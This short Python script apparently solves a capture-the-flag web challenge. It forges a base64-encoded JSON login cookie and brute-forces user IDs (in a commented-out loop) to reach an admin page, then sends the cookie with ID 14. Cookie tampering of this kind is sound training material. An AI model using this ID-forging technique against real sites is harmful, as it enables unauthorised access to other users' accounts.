import requests
from base64 import b64encode

# for i in range(200):
#     c = "{\"ID\":"
#     c += str(i) + "}"
#     c = bytes(c, 'ascii')

#     print(b64encode(c).decode())

#     cookies = {
#         'login': b64encode(c).decode()
#     }

#     r = requests.get("http://sn4ck-sh3nan1gans.challs.olicyber.it/home.php", cookies=cookies)
    
#     if "Welcome admin!" in r.text:
#         print(r.text)
#         print(i)



c = "{\"ID\":"
c += str(14) + "}"
c = bytes(c, 'ascii')

print(b64encode(c).decode())

cookies = {
    'login': b64encode(c).decode()
}

r = requests.get("http://sn4ck-sh3nan1gans.challs.olicyber.it/home.php", cookies=cookies)

print(r.json)